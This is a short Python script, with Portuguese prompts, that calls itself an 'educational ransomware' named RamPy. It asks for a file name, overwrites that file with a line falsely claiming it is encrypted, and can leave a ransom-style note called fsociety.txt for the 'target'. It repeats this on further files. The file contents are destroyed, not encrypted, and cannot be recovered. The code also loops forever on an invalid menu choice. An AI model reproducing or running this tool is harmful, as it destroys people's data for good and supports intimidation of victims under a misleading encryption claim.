from os import system

system_user = int(input('Qual é o seu sistema operacional:\n(1 - Windows/ 2 - Linux) > '))
cont = 0


def system_lines():
    print(' \t------------------------------------------------------------')
    print('\t|                RamPy - Ransomware Educativo                |')
    print(' \t------------------------------------------------------------\n')


while cont == 0:
    if system_user == 1:
        system("cls")
        system_lines()
        choice_user = input('Digite qual e o arquivo junto com a extensão: ')
        file = open(choice_user, 'b+w')
        file.write(b'Este arquivo foi criptografado!')
        file.close()
        print('\nRaptura de arquivos feita com sucesso!')
        choice_message = input('Você deseja escrever uma mensagem para o seu alvo? [S/N]: ')
        if choice_message == 'S' or choice_message == 's':
            message = input('Escreva a sua mensagem\n>')
            message_to_target = open('fsociety.txt', 'w+')
            message_to_target.write(message)
            message_to_target.close()
        else:
            print('\nProcesso finalizado com sucesso!')
        more_files = input('\nDeseja realizar um novo processo? [S/N]: ')
        if more_files == 'S' or more_files == 's':
            cont = 0
        else:
            print('\nProcesso finalizado com sucesso!')
            cont = 1
    elif system_user == 2:
        system("clear")
        system_lines()
        choice_user = input('Digite qual e o arquivo junto com a extensão: ')
        file = open(choice_user, 'b+w')
        file.write(b'Este arquivo foi criptografado!')
        file.close()
        print('\nRaptura de arquivos feita com sucesso!')
        choice_message = input('Você deseja escrever uma mensagem para o seu alvo? [S/N]: ')
        if choice_message == 'S' or choice_message == 's':
            message = input('Escreva a sua mensagem\n>')
            message_to_target = open('fsociety.txt', 'w+')
            message_to_target.write(message)
            message_to_target.close()
        else:
            print('\nProcesso finalizado com sucesso!')

        more_files = input('\nDeseja realizar um novo processo? [S/N]: ')
        if more_files == 'S' or more_files == 's':
            cont = 0
        else:
            print('\nProcesso finalizado com sucesso!')
            cont = 1
    else:
        print('Comando Inválido, por favor, digite novamente\n\n')

system('pause')
